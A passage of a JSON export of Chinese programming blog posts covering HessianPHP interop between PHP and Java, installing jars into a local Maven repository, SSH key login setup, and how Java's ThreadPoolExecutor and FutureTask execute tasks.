			"markdowncontent":"HessianPHP_v2.0.3.zip, 在php作客户端，java作服务器端时，使用注意事项：\n\n### 1.需要在php.ini中配置CURL模块:\n```\nextension=php_curl.dll\n```\n### 2.php传中文给java, 和java返回中文给php，都有中文乱码问题：\n####1) php和java文件本身都采用UTF-8编码\n#### 2)在php.ini中开启mbstring模块:\n```\nextension=php_mbstring.dll\n```\n同时配置：\n```\nmbstring.internal_encoding = UTF-8\n```\n因为：\nHessian2Writer.php文件：\n    \n    function writeStringData($string){\n        return HessianUtils::writeUTF8($string);\n    }\n\nHessianUtils.php文件：\n  \n    public static function isInternalUTF8(){\n        $encoding = ini_get('mbstring.internal_encoding');\n        if(!$encoding)\n            return false;\n        return $encoding == 'UTF-8';\n    }\n\n#### 3).response返回设置为UTF-8：\nheader(\"Content-Type: text/html; charset=UTF-8\");\n\n或者,统一改php.ini文件：\n`mbstring.http_output = UTF-8`\n;启用字符转换功能\n`output_handler = mb_output_handler`\n\n#### 4)默认配置：\nHessianFactory.php\ndefine('HESSIAN_PHP_VERSION', '2.0');  --------->hessian 2.0协议\n\n        $this->transports = array(\n            'CURL' => 'HessianCURLTransport',  ----------->传输协议\n            'curl' => 'HessianCURLTransport',\n            'http' => 'HessianHttpStreamTransport'\n        );\n\n\n### 3.java返回值问题:\n#### 1).java端返回(自定义的)对象，在php端为stdClass Object, 它具有一个属性 [__type] => org.model.User\n\n#### 2).而对于普通对象,例如java的Date对象，在php就是DateTime对象：\n```\n[birthday] => DateTime Object ( [date] => 2012-07-27 15:27:31 [timezone_type] => 1 [timezone] => +00:00 )\n```\n#### 3).java的List, Set, Map，在php就是Array.\nList为php的序号数组:\n```\n[productList1] => Array (\n     [0] => stdClass Object ( [__type] => org.model.Product [name] => 布匹 [price] => 300 )\n)\n```\nMap为php的名称数组:\n```\n[productMap] => Array (\n     [布匹] => stdClass Object ( [__type] => org.model.Product [name] => 布匹 [price] => 300 )\n)\n```\n\njava的返回值，php端不需要做任何特殊映射，可以直接采用->x->y的方式去取值显示.\n\n#### 4).同一个对象，即放在List中，又放在Map中，返回值中为什么只显示一处有值？\n这其实是HessianPHP_v2.0.3.zip的一个bug.\nhessian协议中为了减少重复对象的序列化，采用了引用的方式，参见：\nHessian 2.0 序列化协议规范\nhttp://wenku.baidu.com/view/3832199951e79b8968022641.html\n\n经过debug调试，发现：\n需要修改Hessian2Parser.php中\n```\nfunction untypedMap($code, $num){\n//             if(HessianRef::isRef($key)) $key = &$this->objectlist->reflist[$key->index];\n//             if(HessianRef::isRef($value)) $value = &$this->objectlist->reflist[$value->index];\n            if(HessianRef::isRef($key)) $key = $this->refmap->objectlist[$value->index];\n            if(HessianRef::isRef($value)) $value = $this->refmap->objectlist[$value->index];\n\n}\n```\n同样下面方法也需要修改:\nfunction typedMap($code, $num)\n{\n...\n}\n\n测试结果：\nobjectstdClass Object ( [__type] => User [name] => yangwenchao杨文超 [country] => CHINA [birthday] => DateTime Object ( [date] => 2012-07-28 09:02:32 [timezone_type] => 1 [timezone] => +00:00 ) [productList1] => Array ( [0] => stdClass Object ( [__type] => Product [name] => 布匹 [price] => 300 ) ) [productList2] => Array ( ) [productList3] => [productMap] => Array ( [布匹一] => stdClass Object ( [__type] => Product [name] => 布匹 [price] => 300 ) [布匹二] =>stdClass Object ( [__type] => Product [name] => 布匹 [price] => 300 ) ) )\n\n### 4.php向java传参问题:\n\n### 5.关于类型映射：\nphp是无类型的，默认情况下远程的Object都会变成php的stdClass这样的万能对象。持有这样的对象进行访问的时候，关于对象的属性name, price等信息需要尝试指定。（工作正常）\n\n但是如果把远程Object映射成php本地的自定义的phpObject以后，就可以用一个对象的模子class来框住对象的实体形式，而且编辑器还可以支持语法提示功能。\n\n采用这种方式，在解析返回值时，可以得到便利，在向Java传递对象作为参数时，也可以提供一些便利。\n```\n$options = new HessianOptions();\n$options->typeMap['Person'] = '*.Person';\n$options->typeMap['CalendarHandler'] = 'com.caucho.hessian.io.CalendarHandle';\n$options->parseFilters['@CalendarHandler'] = array('CalendarHandler','calendarToDateTime');\n$options->writeFilters['@Person'] = array('CalendarHandler','writePerson');\n```\n参见例子：\n\n[AdvancedExample  Advanced type mapping and filtering](http://code.google.com/p/hessianphp/wiki/AdvancedExample)\n\n如果不采用自动映射方式，php向java传参时，只能采用php原生的stdClass来传值：\n```\n        $person = new stdClass();      \n        $person->__type = 'org.model.Person'; //参照java返回值的形式，添加上__type属性，其实无效.\n        $person->id = 1;\n        $person->firstName = '杨';\n        $person->lastName = '文超';\n        //$person->birthDate = '';       \n       \n        $user = $proxy->getUserABC($person);\n```\n在java端，总是抛出warning, 显然，java端无视了参数$person->__type的意义：\njava.lang.ClassNotFoundException: stdClass\n2012-7-28 11:13:22 com.caucho.hessian.io.SerializerFactory getDeserializer\n警告: Hessian/Burlap: 'stdClass' is an unknown class in WebappClassLoader\n  context: /springhessian\n  delegate: false\n  repositories:\n    /WEB-INF/classes/\n----------> Parent Classloader:\norg.apache.catalina.loader.StandardClassLoader@1adc30\n\n去掉warning的解决办法：\n```\n$options->typeMap['stdClass'] = 'org.model.Person';\n\n        $options = new HessianOptions();\n        $options->typeMap['stdClass'] = 'org.model.Person';       \n       \n        $url = \"http://localhost:8080/springhessian/remoting/hessianService\"; \n        $proxy = new HessianClient($url, $options); \n        echo \"\n\"; \n       \n        $person = new stdClass();      \n        $person->__type = 'org.model.Person';\n        $person->id = 1;\n        $person->firstName = '杨';\n        $person->lastName = '文超';\n        //$person->birthDate = '';       \n       \n        $user = $proxy->getUserABC($person);\n```\n工作正常。\n\n但是这种方法，只能应对一个类型参数，如果有两个类型的参数，如org.model.Person和org.model.Company，就又无法正常工作了, 因为stdClass不知道到底需要映射到哪一个Java类型上。\n\n所以，在php向java传参时，需要在php中自定义若干个与java相对应的类型，配合\n$options->typeMap['Person'] = 'org.model.Person';\n来一起完成参数类型映射功能。\n例如：\n```\nclass Person{\n        var $id;\n        var $firstName;\n        var $lastName;\n        var $birthDate;\n}\n$p = new Person();\n$p->firtName = 'John';\n$p->lastName = 'Sheppard';\n$options = new HessianOptions();\n$options->typeMap['Person'] = 'com.sample.hessian.Person';\n$proxy = new HessianClient($url, $options);\n$result = $proxy->add($p);\nprint_r($result);\n```\n另外：\n$options->typeMap['Person']='com.sample.hessian.Person';->精确指定，可用于解析返回值，也可用于传参\n$options->typeMap['Person']='*.Person';  ------>采用通配，只适用于解析返回值，不能用于传参\n\n### 6.关于类型自动映射的，回调处理：\n```\n$options->parseFilters['@CalendarHandler'] = array('CalendarHandler','calendarToDateTime');\n$options->writeFilters['@Person'] = array('CalendarHandler','writePerson');\n```\n对于包装类型，有两种方式处理：一是原生构建层级关系，二是采用回调去除包装\n\n一是原生构建层级关系:\n```\n$p = new Person();\n$p->firstName = 'John';\n$p->lastName = 'Sheppard';\n$p->birthDate = new CalendarHandler(new DateTime('1970-06-14 12:00:00'));\n... send the object\n```\n二是采用回调去除包装\n```\n$options->parseFilters['@CalendarHandler'] = array('CalendarHandler','calendarToDateTime');\n$options->writeFilters['@Person'] = array('CalendarHandler','writePerson');\n```\n建议尽量不要有包装类型，如果一定有，采用“原生层级类型”比较容易理解一些。\n\n### 7.原生传值：\n    public User getUserList(List list);  -------->List  ------>对应于php的数字array\n    public User getUserSet(Set set);  -------->Set ------>对应于php的名字array\n    public User getUserMap(Map map);  -------->Map ------>对应于php的名字array\n\n        //$parameter = array('杨', '文超'); //数字array        \n        //$parameter = array('firstName'=>'杨', 'lastName'=>'文超');//名字array   \n        $parameter = array('firstName'=>'杨', 'lastName'=>'文超');  //名字array        \n        //$user = $proxy->getUserList($parameter);\n        //$user = $proxy->getUserSet($parameter);\n        $user = $proxy->getUserMap($parameter);\n\n### 8.返回值为null\n$user = ------->如果java端返回值为null，那么php端为\n$result = isset($user); ------->结果为false\necho $result;  ------>打印后，显示不了false字样\n\n[PHP boolean to string with modification & a condition](http://stackoverflow.com/questions/3671455/php-boolean-to-string-with-modification-a-condition)\n```\necho(is_bool($x) ? ($x ? \"true\":\"false\"):$x);\nNot the easiest to read but gets the job done!\n```",
			"tags":"php,hessian",
			"id":"56677259",
			"categories":"php,hessian",
			"status":1
		},
		"error":"",
		"status":true
	},
	{
		"data":{
			"date":"2017年02月21日 14:07:14",
			"articleedittype":1,
			"private":0,
			"channel":"16",
			"description":"尽管很少存在这样的情况，有时在你的构建过程中，需要将第三方jar包添加到本地仓库中，因为它并存在于像Maven中央仓库或其它的公共仓库中。为了让Maven能够正确获取到jar包，第三方jar包必须放置到本地仓库的正确位置上。Maven已经提供了maven-install-plugin这样的插件能够使Jar包的安装过程更加容易、更少出错。可以用下面的命令安装一个JAR包到本地仓库。mvn instal",
			"title":"Maven安装Jar包到本地仓库",
			"type":"repost",
			"content":"<p>尽管很少存在这样的情况，有时在你的构建过程中，需要将第三方jar包添加到本地仓库中，因为它并存在于像Maven中央仓库或其它的公共仓库中。为了让Maven能够正确获取到jar包，第三方jar包必须放置到本地仓库的正确位置上。</p>\n\n<p>Maven已经提供了maven-install-plugin这样的插件能够使Jar包的安装过程更加容易、更少出错。可以用下面的命令安装一个JAR包到本地仓库。</p>\n\n<pre class=\"prettyprint\"><code class=\" hljs lasso\">mvn install:install<span class=\"hljs-attribute\">-file</span> <span class=\"hljs-attribute\">-Dfile</span><span class=\"hljs-subst\">=</span> <span class=\"hljs-attribute\">-DgroupId</span><span class=\"hljs-subst\">=</span> <span class=\"hljs-attribute\">-DartifactId</span><span class=\"hljs-subst\">=</span> <span class=\"hljs-attribute\">-Dversion</span><span class=\"hljs-subst\">=</span> <span class=\"hljs-attribute\">-Dpackaging</span><span class=\"hljs-subst\">=</span></code></pre>\n\n<p>如果也有pom文件的话，你可以使用下面的命令安装：</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs lasso\">mvn install:install<span class=\"hljs-attribute\">-file</span> <span class=\"hljs-attribute\">-Dfile</span><span class=\"hljs-subst\">=</span> <span class=\"hljs-attribute\">-DpomFile</span><span class=\"hljs-subst\">=</span></code></pre>\n\n<p>maven-install-plugin的2.5版本使安装过程更加好用，如果jar包是通过Maven构建的，它会在目录META-INF的子文件夹下创建一个pom.xml文件，这个Jar包会被默认读取。在这种情况下，你只需要这么做：</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs cmake\">mvn <span class=\"hljs-keyword\">install</span>:<span class=\"hljs-keyword\">install</span>-file -Dfile=</code></pre>",
			"markdowncontent":"尽管很少存在这样的情况，有时在你的构建过程中，需要将第三方jar包添加到本地仓库中，因为它并存在于像Maven中央仓库或其它的公共仓库中。为了让Maven能够正确获取到jar包，第三方jar包必须放置到本地仓库的正确位置上。\n\nMaven已经提供了maven-install-plugin这样的插件能够使Jar包的安装过程更加容易、更少出错。可以用下面的命令安装一个JAR包到本地仓库。\n\n```\nmvn install:install-file -Dfile= -DgroupId= -DartifactId= -Dversion= -Dpackaging=\n```\n如果也有pom文件的话，你可以使用下面的命令安装：\n```\nmvn install:install-file -Dfile= -DpomFile=\n```\nmaven-install-plugin的2.5版本使安装过程更加好用，如果jar包是通过Maven构建的，它会在目录META-INF的子文件夹下创建一个pom.xml文件，这个Jar包会被默认读取。在这种情况下，你只需要这么做：\n```\nmvn install:install-file -Dfile=\n```",
			"tags":"maven,jar",
			"id":"56281469",
			"categories":"maven",
			"status":1
		},
		"error":"",
		"status":true
	},
	{
		"data":{
			"date":"2017年02月14日 19:54:01",
			"articleedittype":1,
			"private":0,
			"channel":"12",
			"description":"在mac下生成public_key与private_key\nssh-keygen -t rsa生成的密钥在~/.ssh/目录下查看 \n2.  把mac下刚生成的public_key “id_rsa.pub”文件拷贝一份到远端服务器即将需要登录用户家目录下的.ssh/目录下，并命名为authorized_keys. \n3. 最后修改本机mac下得配置文件，~/.ssh/config，格式如下Hostn",
			"title":"终端使用别名记住登录ssh的ip登录",
			"type":"original",
			"content":"<ol>\n<li>在终端下生成public_key与private_key</li>\n</ol>\n\n<pre class=\"prettyprint\"><code class=\" hljs lasso\">ssh<span class=\"hljs-attribute\">-keygen</span> <span class=\"hljs-attribute\">-t</span> rsa</code></pre>\n\n<p>生成的密钥在~/.ssh/目录下查看 <br>\n2.  把终端下刚生成的public_key “id_rsa.pub”文件拷贝一份到远端服务器即将需要登录用户家目录下的.ssh/目录下，并命名为authorized_keys. <br>\n3. 最后修改本机mac下得配置文件，~/.ssh/config，格式如下</p>\n\n<p><img src=\"http://img.blog.csdn.net/20170214195241715?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXV1cXU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast\" alt=\"信息\" title=\"\"></p>\n\n<p>Hostname替换成相应的ip或域名即可</p>",
			"markdowncontent":"1.   在终端下生成public_key与private_key\n\n\n```\nssh-keygen -t rsa\n```\n\n生成的密钥在~/.ssh/目录下查看\n2.  把终端下刚生成的public_key \"id_rsa.pub\"文件拷贝一份到远端服务器即将需要登录用户家目录下的.ssh/目录下，并命名为authorized_keys.\n3. 最后修改本机mac下得配置文件，~/.ssh/config，格式如下\n\n![信息](http://img.blog.csdn.net/20170214195241715?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXV1cXU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast)\n\nHostname替换成相应的ip或域名即可\n\n",
			"tags":"linux,ssh",
			"id":"55105493",
			"categories":"linux",
			"status":1
		},
		"error":"",
		"status":true
	},
	{
		"data":{
			"date":"2017年02月14日 16:15:39",
			"articleedittype":1,
			"private":0,
			"channel":"16",
			"description":"上一篇文章中通过引入的一个例子介绍了在Executor框架下，提交一个任务的过程，这个过程就像我们老大的老大要找个老大来执行一个任务那样简单。并通过剖析ExecutorService的一种经典实现ThreadPoolExecutor来分析接收任务的主要逻辑，发现ThreadPoolExecutor的工作思路和我们带项目的老大的工作思路完全一致。在本文中我们将继续后面的步骤，着重描述下任务执行的过程和",
			"title":"戏（细）说Executor框架线程池任务执行全过程（下）",
			"type":"repost",
			"content":"<p><a href=\"http://www.infoq.com/cn/articles/executor-framework-thread-pool-task-execution-part-01\">上一篇文章</a>中通过引入的一个例子介绍了在Executor框架下，提交一个任务的过程，这个过程就像我们老大的老大要找个老大来执行一个任务那样简单。并通过剖析ExecutorService的一种经典实现ThreadPoolExecutor来分析接收任务的主要逻辑，发现ThreadPoolExecutor的工作思路和我们带项目的老大的工作思路完全一致。在本文中我们将继续后面的步骤，着重描述下任务执行的过程和任务执行结果获取的过程。会很容易发现，这个过程我们更加熟悉，因为正是每天我们工作的过程。除了ThreadPoolExecutor的内部类Worker外，对执行内容和执行结果封装的FutureTask的表现是这部分着重需要了解的。</p>\n\n<p>为了连贯期间，内容的编号延续上篇。</p>\n\n<ol>\n<li>任务执行 <br>\n其实应该说是任务被执行，任务是宾语。动宾结构：execute the task，执行任务，无论写成英文还是中文似乎都是这样。那么主语是是who呢？明显不是调用submit的那位（线程），那是哪位呢？上篇介绍ThreadPoolExecutor主要属性时提到其中有一个HashSet workers的集合，我们有说明这里存储的就是线程池的工作队列的集合，队列的对象是Worker类型的工作线程，是ThreadPoolExecutor的一个内部类，实现了Runnable接口：</li>\n</ol>\n\n\n\n<pre class=\"prettyprint\"><code class=\"language-java hljs \">    <span class=\"hljs-keyword\">private</span> <span class=\"hljs-keyword\">final</span> <span class=\"hljs-class\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title\">Worker</span> <span class=\"hljs-keyword\">implements</span> <span class=\"hljs-title\">Runnable</span></span></code></pre>\n\n<p>8)  看作业线程干什么当然是看它的run方法在干什么。如我们所料，作业线程就是在一直调用getTask方法获取任务，然后调用 runTask(task)方法执行任务。看到没有，是在while循环里面，就是不干完不罢休的意思！在加班干活的苦逼的朋友们，有没有遇见战友的亲切感觉？</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\"language-java hljs \">        <span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">void</span> <span class=\"hljs-title\">run</span>() {\n                <span class=\"hljs-keyword\">try</span> {\n                    Runnable task = firstTask;\n                    <span class=\"hljs-comment\">//循环从线程池的任务队列获取任务</span>\n                    <span class=\"hljs-keyword\">while</span> (task != <span class=\"hljs-keyword\">null</span> || (task = getTask()) != <span class=\"hljs-keyword\">null</span>) {\n                    <span class=\"hljs-comment\">//执行任务</span>\n                        runTask(task);\n                        task = <span class=\"hljs-keyword\">null</span>;\n                    }\n                } <span class=\"hljs-keyword\">finally</span> {\n                    workerDone(<span class=\"hljs-keyword\">this</span>);\n                }\n            }</code></pre>\n\n<p>然后简单看下getTask和runTask(task)方法的内容。</p>\n\n<p>9) getTask方法是ThreadPoolExecutor提供给其内部类Worker的的方法。作用就是一个，从任务队列中取任务，源源不断地输出任务。有没有想到老大手里拿的总是满满当当的project，也是源源不断的。</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\"language-java hljs \">    Runnable getTask() {\n            <span class=\"hljs-keyword\">for</span> (;;) {\n                      <span class=\"hljs-comment\">//从任务队列的头部取任务</span>\n                      r = workQueue.take();\n                        <span class=\"hljs-keyword\">return</span> r;\n     }\n        }</code></pre>\n\n<p>10) runTask(Runnable task)是工作线程Worker真正处理拿到的每个具体任务。看到这里才可用确认我们的猜想，<a href=\"之前提到\">之前提到</a><a href=\"#_msocom_1\">[y1]</a> 的“执行任务”这个动宾结构前面的主语正是这些Worker呀。唠叨了半天（看主要方法都看到了整整第10个了），前面都是派活，这里才是干活。和我们的工作何其相似！老大（LD），老大的老大（LD^2），老大的老大（LD^n） 非常辛苦，花了很多时间、精力在会议室、在project上想着怎么生成和安排任务，然而真的轮到咱哥们干活，可能花了不少时间，但看看流程就是这么简单。<strong>三个大字：“<em><strong>*Just do it*</strong></em></strong>”。</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\"language-java hljs \">      <span class=\"hljs-keyword\">private</span> <span class=\"hljs-keyword\">void</span> <span class=\"hljs-title\">runTask</span>(Runnable task) {          \n                       <span class=\"hljs-comment\">//调用任务的run方法，即在Worker线程中执行Task内定义内容。</span>\n                        task.run();\n            }</code></pre>\n\n<p>需要注意的地方出现了，调用的其实是task的run方法。看下FutureTask的run方法做了什么事情。</p>\n\n<p>这里插入一个FutureTask的类图。可以看到FutureTask实现了RunnableFuture接口，所以FutureTask即有Runnable接口的run方法来定义任务内容，也有Future接口中定义的get、cancel等方法来控制任务执行和获取执行结果。Runnable接口自不用说，Future接口的伟大设计，就是使得实现该接口的对象可以阻塞线程直到任务执行完毕，也可以取消任务执行，检测任务是执行完毕还是被取消了。想想在之前我们使用Thread.join()或者Thread.join(long millis)等待任务结束是多么苦涩啊。</p>\n\n<p>FutureTask内部定义了一个Sync的内部类，继承自AQS，来维护任务状态。关于AQS的设计思路，可以参照参考Doug Lea大师的原著<a href=\"http://gee.cs.oswego.edu/dl/papers/aqs.pdf\">The java.util.concurrent Synchronizer Framework</a>。</p>\n\n<p><a href=\"http://cdn4.infoqstatic.com/statics_s2_20170208-0257_3/resource/articles/executor-framework-thread-pool-task-execution-part-02/zh/resources/0601001.jpg\"><img src=\"http://cdn4.infoqstatic.com/statics_s2_20170208-0257_3/resource/articles/executor-framework-thread-pool-task-execution-part-02/zh/resources/0601001.jpg\" alt=\"\" title=\"\"></a></p>\n\n<p>11) 和其他的同步工具类一样，FutureTask的主要工作内容也是委托给其定义的内部类Sync来完成。</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\"language-java hljs \">       <span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">void</span> <span class=\"hljs-title\">run</span>() {\n            <span class=\"hljs-comment\">//调用Sync的对应方法</span>\n            sync.innerRun();\n        }</code></pre>\n\n<p>12)   FutureTask.Sync.innerRun()，这样做的目的就是为了维护任务执行的状态，只有当执行完后才能够获得任务执行结果。在该方法中，首先设置执行状态为RUNNING只有判断任务的状态是运行状态，才调用任务内封装的回调，并且在执行完成后设置回调的返回值到FutureTask的result变量上。在FutureTask中，innerRun等每个“写”方法都会首先修改状态位，在后续会看到innerGet等“读”方法会先判断状态，然后才能决定后续的操作是否可以继续。下图是FutureTask.Sync中几个重要状态的流转情况，和其他的同步工具类一样，状态位使用的也是父类AQS的state属性。</p>\n\n<p><a href=\"http://cdn4.infoqstatic.com/statics_s2_20170208-0257_3/resource/articles/executor-framework-thread-pool-task-execution-part-02/zh/resources/0601002.png\"><img src=\"http://cdn4.infoqstatic.com/statics_s2_20170208-0257_3/resource/articles/executor-framework-thread-pool-task-execution-part-02/zh/resources/0601002.png\" alt=\"\" title=\"\"></a></p>\n\n\n\n<pre class=\"prettyprint\"><code class=\"language-java hljs \">    <span class=\"hljs-keyword\">void</span> innerRun() {\n                <span class=\"hljs-comment\">//通过对AQS的状态位state的判断来判断任务的状态是运行状态，则调用任务内封装的回调，并且设置回调的返回值</span>\n                    <span class=\"hljs-keyword\">if</span> (getState() == RUNNING) \n                        innerSet(callable.call());   \n            }\n\n        <span class=\"hljs-keyword\">void</span> innerSet(V v) {\n            <span class=\"hljs-keyword\">for</span> (;;) {\n            <span class=\"hljs-keyword\">int</span> s = getState();\n                <span class=\"hljs-comment\">//设置运行状态为完成，并且把回调额执行结果设置给result变量</span>\n            <span class=\"hljs-keyword\">if</span> (compareAndSetState(s, RAN)) {\n                        result = v;\n                        releaseShared(<span class=\"hljs-number\">0</span>);\n                        done();\n                <span class=\"hljs-keyword\">return</span>;\n                    }\n                }</code></pre>\n\n<p>至此工作线程执行Task就结束了。提交的任务是由Worker工作线程执行，正是在该线程上调用Task中定义的任务内容，即封装的Callable回调，并设置执行结果。下面就是最重要的部分：调用者如何获取执行的结果。让你加班那么久，总得把成果交出来吧。老大在等，因为老大的老大在等！</p>\n\n<ol>\n<li>获取执行结果</li>\n</ol>\n\n<p>前面说过，对于老大的老大这样的使用者来说，获取执行结果这个过程总是最容易的事情，只需调用FutureTask的get()方法即可。该方法是在Future接口中就定义的。get方法的作用就是等待执行结果。（Waits if necessary for the computation to complete, and then retrieves its result.）Future这个接口命名得真好，虽然是在未来，但是定义有一个get()方法，总是“可以掌控的未来，总是有收获的未来！”实现该接口的FutureTask也应该是这个意思，在未来要完成的任务，但是一样要有结果哦。</p>\n\n<p>13)  FutureTask的get方法同样委托给Sync来执行。和该方法类似，还有一个V get(long timeout, TimeUnit unit)，可以配置超时时间。</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\"language-java hljs \">       <span class=\"hljs-keyword\">public</span> V <span class=\"hljs-title\">get</span>() <span class=\"hljs-keyword\">throws</span> InterruptedException, ExecutionException {\n            <span class=\"hljs-keyword\">return</span> sync.innerGet();\n        }</code></pre>\n\n<p>14)  在<a href=\"Sync\">Sync</a>的 innerGet方法中，调用AQS父类定义的获取共享锁的方法acquireSharedInterruptibly来等待执行完成。如果执行完成了则可以继续执行后面的代码，返回result结果，否则如果还未完成，则阻塞线程等待执行完成。<a href=\"#_msocom_2\">[bd2]</a> 再大的老大要想获得结果也得等老子干完了才行！可以看到调用FutureTask的get方法，进而调用到该方法的一定是想要执行结果的线程，一般应该就是提交Task的线程，而这个任务的执行是在Worker的工作线程上，通过AQS来保证执行完毕才能获取执行结果。该方法中acquireSharedInterruptibly是AQS父类中定义的获取共享锁的方法，<a href=\"但是到底满足什么条件可以成功获取共享锁，这是\">但是到底满足什么条件可以成功获取共享锁，这是</a>Sync的tryAcquireShared方法内定义的。<a href=\"#_msocom_3\">[bd3]</a> 具体说来，innerIsDone用来判断是否执行完毕，如果执行完毕则向下执行，返回result即可；如果判断未完成，则调用AQS的doAcquireSharedInterruptibly来挂起当前线程，一直到满足条件。这种思路在其他的几种同步工具类<a href=\"http://docs.oracle.com/javase/7/docs/api/java/util/concurrent/Semaphore.html\">Semaphore</a>、<a href=\"http://docs.oracle.com/javase/7/docs/api/java/util/concurrent/CountDownLatch.html\">CountDownLatch</a>、<a href=\"http://docs.oracle.com/javase/7/docs/api/java/util/concurrent/locks/ReentrantLock.html\">ReentrantLock</a>、<a href=\"http://docs.oracle.com/javase/7/docs/api/java/util/concurrent/locks/ReentrantReadWriteLock.html\">ReentrantReadWriteLock</a>也广泛使用。借助AQS框架，在获取锁时，先判断当前状态是否允许获取锁，若是允许则获取锁，否则获取不成功。获取不成功则会阻塞，进入阻塞队列。而释放锁时，一般会修改状态位，唤醒队列中的阻塞线程。每个同步工具类的自定义同步器都继承自AQS父类，是否可以获取锁根据同步类自身的功能要求覆盖AQS对应的try前缀方法，这些方法在AQS父类中都是只有定义没有内容。可以参照《<a href=\"http://www.idouba.net/sync-implementation-by-aqs/\">源码剖析AQS在几个同步工具类中的使用</a>》来详细了解。</p>\n\n<p>突然想到想想那些被称为老大的，是不是整个career流程就是只干两件事情：submit a task， then wait and get the result。不对，还有一件事情，不是等待，而是催。“完了没，完了没？schedule很紧的，抓点紧啊，要不要适当加点班啊……”</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\"language-java hljs \">    V innerGet() <span class=\"hljs-keyword\">throws</span> InterruptedException, ExecutionException {\n               <span class=\"hljs-comment\">//获得锁，表示执行完毕，才能获得后执行结果，否则阻塞等待执行完成再获取执行结果</span>\n                acquireSharedInterruptibly(<span class=\"hljs-number\">0</span>);\n                <span class=\"hljs-keyword\">return</span> result;\n            }\n\n            <span class=\"hljs-keyword\">protected</span> <span class=\"hljs-keyword\">int</span> <span class=\"hljs-title\">tryAcquireShared</span>(<span class=\"hljs-keyword\">int</span> ignore) {\n                <span class=\"hljs-keyword\">return</span> innerIsDone()? <span class=\"hljs-number\">1</span> : -<span class=\"hljs-number\">1</span>;\n            }</code></pre>\n\n<p>至此，获得执行结果，圆满完成任务！</p>\n\n<p>老大的老大，拍着咱们老大的肩膀（或者深情的抚摸着咱们老大唏嘘胡茬的脸庞）说：“亲，你这活干的漂亮！”而隔壁桌座位的几个兄弟，刚熬了几个晚上加班交付完这波task后，发现任务队列里又有新任务了，俺们老大又从他的另外一个老大手里接来的任务了。每个人都按照这样的角色进行着，依照这样的角色安排和谐愉快地进行着。。。</p>\n\n<p><strong>角色名</strong></p>\n\n<p><strong>任务用户</strong></p>\n\n<p><strong>任务管理者</strong></p>\n\n<p><strong>任务执行者</strong></p>\n\n<p>角色属性</p>\n\n<p>任务的甲方</p>\n\n<p>任务的乙方</p>\n\n<p>乙方的工具</p>\n\n<p>角色说明</p>\n\n<p>选择合适的任务执行服务，如可以根据需要选择ThreadPoolExecutor还是ScheduledThreadPoolExecutor，并定制ExecutorService的配置。</p>\n\n<pre><code>        定义好任务的工作内容和结果类型，提交任务，等待任务的执行结果\n</code></pre>\n\n<p>接收提交的任务；</p>\n\n<pre><code>        维护执行服务内部管理；\n\n        配置工作线程执行任务\n</code></pre>\n\n<p>每个工作线程一直从任务执行服务获取待执行的任务，保证任务完成后返回执行结果。</p>\n\n<p>Executor中对应</p>\n\n<p>创建获取ExecutorService、并提交Task的外部接口</p>\n\n<p>ExecutorService的各种实现。如经典的ThreadPoolExecutor，ScheduledThreadPoolExecutor</p>\n\n<p>执行服务内定义的配套的Worker线程。如ThreadPoolExecutor.Worker</p>\n\n<p>主要接口方法</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\"language-java hljs \">\nsubmit(Callable task)\n\nexecute(Runnable command)\n\nrunTask(Runnable task)</code></pre>\n\n<p>现实角色映射</p>\n\n<p>手里有活的大老大</p>\n\n<p>领人干活的老大</p>\n\n<p>真正干活的码农</p>\n\n<p>主要工作伪代码</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\"language-java hljs \">taskService = createService()\n\n            future=taskService.submitTask()\n\n            future.get()\n\nexecuteTask()\n\n            { addTask()\n\n            createThread()\n\n            }\n\n<span class=\"hljs-keyword\">while</span>(ture) {\n\n            getTask()\n\n            runTask()\n\n            }</code></pre>\n\n<h5 id=\"四-总结\">四、 总结</h5>\n\n<p>从时序图上看主要的几个角色是这样配合完成任务提交、任务执行、获取执行结果这几个步骤的。</p>\n\n<p><a href=\"http://cdn4.infoqstatic.com/statics_s2_20170208-0257_3/resource/articles/executor-framework-thread-pool-task-execution-part-02/zh/resources/0601003.png\"><img src=\"http://cdn4.infoqstatic.com/statics_s2_20170208-0257_3/resource/articles/executor-framework-thread-pool-task-execution-part-02/zh/resources/0601003.png\" alt=\"\" title=\"\"></a></p>\n\n<ol>\n<li>外面需要提交任务的角色（如例子中老大的老大），首先创建一个任务执行服务ExecutorService，一般使用工具类Executors的若干个工厂方法 